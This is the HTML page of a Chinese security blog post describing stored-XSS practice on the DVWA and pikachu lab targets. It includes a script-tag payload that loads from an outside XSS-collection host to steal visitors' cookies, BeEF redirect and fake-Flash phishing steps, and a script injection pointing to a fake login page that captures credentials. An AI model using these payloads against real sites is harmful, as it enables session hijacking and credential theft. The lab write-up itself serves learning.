@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zh1yu.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="这里用两个平台通过xss进行cookie的劫持和钓鱼演示">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss靶场实战测试">
+<meta property="og:url" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="知鱼的Blog">
+<meta property="og:description" content="这里用两个平台通过xss进行cookie的劫持和钓鱼演示">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/1.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/2.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/3.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/4.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/5.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/6.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/7.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/8.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/17.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/11.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/18.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/9.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/12.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/13.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/14.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/15.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/16.png">
+<meta property="article:published_time" content="2025-07-07T02:28:06.000Z">
+<meta property="article:modified_time" content="2025-07-07T04:31:11.809Z">
+<meta property="article:author" content="zh1yu">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/1.png">
+
+<link rel="canonical" href="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>xss靶场实战测试 | 知鱼的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">知鱼的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/zh1yu2.jpg">
+      <meta itemprop="name" content="zh1yu">
+      <meta itemprop="description" content="花有重开日,人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="知鱼的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xss靶场实战测试
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-07-07 10:28:06 / 修改时间：12:31:11" itemprop="dateCreated datePublished" datetime="2025-07-07T10:28:06+08:00">2025-07-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> 这里用两个平台通过xss进行cookie的劫持和钓鱼演示</p>
+<span id="more"></span>
+<h2 id="cookie劫持"><a href="#cookie劫持" class="headerlink" title="cookie劫持"></a>cookie劫持</h2><p>这里用到的是dvwa和<a target="_blank" rel="noopener" href="https://xssaq.com/平台">https://xssaq.com/平台</a></p>
+<p>我们先来到dvwa的存储型xss，这里设置为low模式，然后在xssaq平台创建一个项目，然后使用<code>&lt;sCRiPt sRC=//xs.pe/f4y&gt;&lt;/sCrIpT&gt;</code>命令，输入到dvwa的存储型xss中</p>
+<p><img src="1.png" alt="图片"></p>
+<p>当有其他用户访问到该存储型xss页面时，xssaq平台就会记录下该用户的cookie等信息</p>
+<p><img src="2.png" alt="图片"><img src="3.png" alt="图片"></p>
+<h2 id="flash钓鱼演示"><a href="#flash钓鱼演示" class="headerlink" title="flash钓鱼演示"></a>flash钓鱼演示</h2><p>需要用到kali中的<strong>Beef-xss</strong>工具，下载命令：<code>apt install beef-xss</code>，使用<code>beef-xss</code>命令打开，用户名beef，密码：自己下载时配置的，使用下面的命令执行</p>
+<p><img src="4.png" alt="图片"></p>
+<p>将ip换成自己kali的ip地址，这里前端有长度限制，直接修改：</p>
+<p><img src="5.png" alt="图片"></p>
+<p>当有其他用户访问（我们自己访问也算），beef上就有该记录了</p>
+<p><img src="6.png" alt="图片"></p>
+<h3 id="地址跳转"><a href="#地址跳转" class="headerlink" title="地址跳转"></a>地址跳转</h3><p>我们找到redirect命令，在右边填写跳转地址的相关信息</p>
+<p><img src="7.png" alt="图片"></p>
+<p>回到dvwa，就会发现跳转到ww.baidu.com</p>
+<p><img src="8.png" alt="图片"></p>
+<h3 id="flash钓鱼"><a href="#flash钓鱼" class="headerlink" title="flash钓鱼"></a>flash钓鱼</h3><p>找到beef上的flash命令，在网上找一张flash图片填入其地址，payload url一般是设置为下载木马的文件，这里就设置成baidu了</p>
+<p><img src="17.png" alt="图片"><img src="11.png" alt="图片"><img src="18.png" alt="图片"></p>
+<h3 id="pikachu钓鱼"><a href="#pikachu钓鱼" class="headerlink" title="pikachu钓鱼"></a>pikachu钓鱼</h3><p>在pikachu靶场上有一个钓鱼文件：<code>/pikachu/pkxss/xfish/fish.php</code>，我们这个这个来模拟钓鱼测试，下面是模拟登录页面：</p>
+<p><img src="9.png" alt="图片"></p>
+<p>这里需要先安装一下<code>/pkxss/pkxss_install.php</code>（需要提前配置好数据库连接）</p>
+<p><img src="12.png" alt="图片"></p>
+<p><img src="13.png" alt="图片"></p>
+<p>我们在dvwa的存储型xss中插入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;xxx&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="comment">//xxx是pikachhu演示的钓鱼地址，localhost要换成ip地址</span></span><br><span class="line"><span class="comment">//比如我的是：&lt;script src=&quot;http://192.168.130.1:92/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.130.1:92/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="14.png" alt="图片"><img src="15.png" alt="图片"></p>
+<p>输入的账号密码，就会被记录到pikachu的后台</p>
+<p><img src="16.png" alt="图片"></p>
+<p>但是钓鱼结果里面没显示登录的信息，有点怪怪的</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>zh1yu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://zh1yu.xyz/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/" title="xss靶场实战测试">http://zh1yu.xyz/2025/07/07/xss靶场实战测试/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/xss/" rel="tag"># xss</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/07/07/xss-labs%E7%AC%AC1-9%E5%85%B3%E7%BB%83%E4%B9%A0%E6%B5%8B%E8%AF%95/" rel="prev" title="xss-labs第1-9关练习测试">
+      <i class="fa fa-chevron-left"></i> xss-labs第1-9关练习测试
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie%E5%8A%AB%E6%8C%81"><span class="nav-number">1.</span> <span class="nav-text">cookie劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flash%E9%92%93%E9%B1%BC%E6%BC%94%E7%A4%BA"><span class="nav-number">2.</span> <span class="nav-text">flash钓鱼演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E8%B7%B3%E8%BD%AC"><span class="nav-number">2.1.</span> <span class="nav-text">地址跳转</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flash%E9%92%93%E9%B1%BC"><span class="nav-number">2.2.</span> <span class="nav-text">flash钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pikachu%E9%92%93%E9%B1%BC"><span class="nav-number">2.3.</span> <span class="nav-text">pikachu钓鱼</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zh1yu"
+      src="/images/zh1yu2.jpg">
+  <p class="site-author-name" itemprop="name">zh1yu</p>
+  <div class="site-description" itemprop="description">花有重开日,人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/1182418846@qq.com" title="QQ → 1182418846@qq.com"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class=""></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zh1yu</span>
+</div>
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="/js/snow.js"></script>
+
+</body>
+</html>
